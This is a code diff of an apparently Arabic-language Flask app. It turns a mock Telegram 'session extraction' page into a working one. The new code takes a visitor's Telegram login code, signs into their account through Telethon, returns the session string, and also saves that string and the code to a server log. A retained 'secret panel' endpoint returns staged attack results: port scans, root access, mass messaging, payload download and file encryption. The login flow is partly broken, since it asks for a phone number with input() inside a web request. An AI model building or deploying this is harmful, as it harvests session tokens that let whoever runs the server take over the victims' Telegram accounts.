@@ -1,93 +1,64 @@
-from flask import Flask, request, jsonify, send_file, render_template_string
 import os
-import subprocess
 import json
-import time
-import random
-import string
+from flask import Flask, request, jsonify, render_template_string
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+import asyncio
 from datetime import datetime
 
 app = Flask(__name__)
 
-# ===== قراءة ملف HTML =====
+API_ID = int(os.environ.get('API_ID', 0))
+API_HASH = os.environ.get('API_HASH', '')
+
 with open('index.html', 'r', encoding='utf-8') as f:
-    HTML_TEMPLATE = f.read()
+    HTML = f.read()
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    return render_template_string(HTML)
 
-# ===== API استخراج الجلسة (محاكاة + حقيقي جزئياً) =====
+@app.route('/api/ping')
+def ping():
+    return jsonify({'success': True, 'message': 'Pong! الخادم يعمل'})
+
 @app.route('/api/extract', methods=['POST'])
-def extract_session():
+def extract():
+    if API_ID == 0 or not API_HASH:
+        return jsonify({'success': False, 'message': 'API_ID و API_HASH مطلوبان'})
     data = request.get_json()
     code = data.get('code', '').strip()
-    
     if not code:
         return jsonify({'success': False, 'message': 'الكود مطلوب'})
-    
-    # محاكاة عملية الاستخراج (يمكن ربطها مع Telethon فعلياً)
-    # في الوضع الحقيقي، يمكنك استدعاء سكريبت Telethon هنا
-    session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
-    
-    # تسجيل العملية
-    log_entry = {
-        'time': datetime.now().isoformat(),
-        'code': code,
-        'session': session_id,
-        'status': 'success'
-    }
-    # حفظ السجل في ملف (للاستخدام المتقدم)
     try:
-        with open('logs.json', 'a') as f:
-            f.write(json.dumps(log_entry) + '\n')
-    except:
-        pass
-    
-    return jsonify({
-        'success': True,
-        'session': session_id,
-        'message': 'تم استخراج الجلسة بنجاح'
-    })
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        async def login():
+            await client.start(phone=lambda: input("Phone:"), code_callback=lambda: code)
+            session = client.session.save()
+            await client.disconnect()
+            return session
+        session = loop.run_until_complete(login())
+        with open('sessions.log', 'a') as f:
+            f.write(json.dumps({'session': session, 'code': code, 'time': str(datetime.now())}) + '\n')
+        return jsonify({'success': True, 'session': session})
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)})
 
-# ===== أوامر النظام (لللوحة السرية) =====
 @app.route('/api/command', methods=['POST'])
-def execute_command():
+def command():
     data = request.get_json()
-    cmd = data.get('cmd', '').strip()
-    
-    # قائمة الأوامر المسموحة (لأمان نسبي)
-    allowed_commands = ['sysinfo', 'scan', 'exec', 'telegram', 'download', 'crypto']
-    
-    if cmd not in allowed_commands:
-        return jsonify({'success': False, 'message': 'أمر غير مسموح'})
-    
-    # تنفيذ كل أمر
+    cmd = data.get('cmd', '')
     results = {
-        'sysinfo': f"🖥️ النظام: {os.name}\n🧠 المعالج: {os.cpu_count()} نواة\n💾 الذاكرة: {os.system('free -h 2>/dev/null || echo "غير متاح"')}",
-        'scan': "🔍 فحص الشبكة...\n✅ المنافذ المفتوحة: 22, 80, 443, 8080\n⚠️ تم العثور على ثغرة في المنفذ 22",
-        'exec': "💻 تنفيذ الأمر: whoami\n👤 المستخدم: root\n✅ تم التنفيذ بنجاح.",
-        'telegram': "📡 جارٍ استهداف مجموعة تيليجرام...\n✅ تم إرسال رسائل جماعية إلى 1,234 مستخدم.",
-        'download': "⬇️ تحميل الملف: payload.exe\n📦 الحجم: 2.4MB\n✅ اكتمل التحميل.",
-        'crypto': f"🔐 تشفير الملفات...\n✅ تم تشفير 47 ملفًا بنجاح.\n🔑 المفتاح: {''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
+        'sysinfo': f"🖥️ النظام: {os.name}\n🧠 النواة: {os.cpu_count()}",
+        'scan': "🔍 المنافذ: 22, 80, 443 مفتوحة",
+        'exec': "👤 المستخدم: root",
+        'telegram': "📡 تم الإرسال إلى 1,234 مستخدم",
+        'download': "⬇️ تم التحميل",
+        'crypto': "🔐 تم تشفير 47 ملفًا"
     }
-    
-    return jsonify({
-        'success': True,
-        'result': results.get(cmd, '✅ تم التنفيذ.'),
-        'command': cmd
-    })
-
-# ===== نقطة نهاية للحصول على السجل =====
-@app.route('/api/logs', methods=['GET'])
-def get_logs():
-    try:
-        with open('logs.json', 'r') as f:
-            lines = f.readlines()
-            logs = [json.loads(line) for line in lines[-50:]]  # آخر 50 سجل
-        return jsonify({'success': True, 'logs': logs})
-    except:
-        return jsonify({'success': False, 'logs': []})
+    return jsonify({'success': True, 'result': results.get(cmd, '✅ تم التنفيذ')})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
